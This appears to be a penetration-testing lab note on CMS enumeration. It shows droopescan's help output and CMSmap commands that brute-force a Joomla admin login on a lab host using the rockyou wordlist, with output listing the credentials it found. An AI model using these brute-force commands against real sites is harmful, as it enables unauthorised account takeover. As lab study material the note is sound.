## Enumeration
droopescan, a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
````bash
droopescan -h

usage: droopescan (sub-commands ...) [options ...] {arguments ...}

    |
 ___| ___  ___  ___  ___  ___  ___  ___  ___  ___
|   )|   )|   )|   )|   )|___)|___ |    |   )|   )
|__/ |    |__/ |__/ |__/ |__   __/ |__  |__/||  /
                    |
=================================================

commands:

  scan
    cms scanning functionality.

  stats
    shows scanner status & capabilities.

optional arguments:
  -h, --help  show this help message and exit
  --debug     toggle debug output
  --quiet     suppress all output

Example invocations: 
  droopescan scan drupal -u URL_HERE
  droopescan scan silverstripe -u URL_HERE

More info: 
  droopescan scan --help
 
Please see the README file for information regarding proxies.
````
````bash
droopescan scan --help.
````
### CMSmap
````bash
git clone https://github.com/Dionach/CMSmap.git
cd CMSmap

python3 cmsmap.py http://app.inlanefreight.local -f J -F --usernames admin --passwords /usr/share/wordlists/rockyou.txt
````
results & attacking 
````bash
python3 cmsmap.py http://app.inlanefreight.local -u admin -p http_default_pass.txt
[-] Date & Time: 02/03/2026 12:19:12
[-] Target: http://app.inlanefreight.local (10.129.17.48)
[-] Starting Brute Forcing: J
[H] Valid Credentials: admin turnkey
[H] Valid Credentials: admin vagrant
[H] Valid Credentials: admin admin
[-] Date & Time: 02/03/2026 12:19:25
[-] Completed in: 0:00:13
````
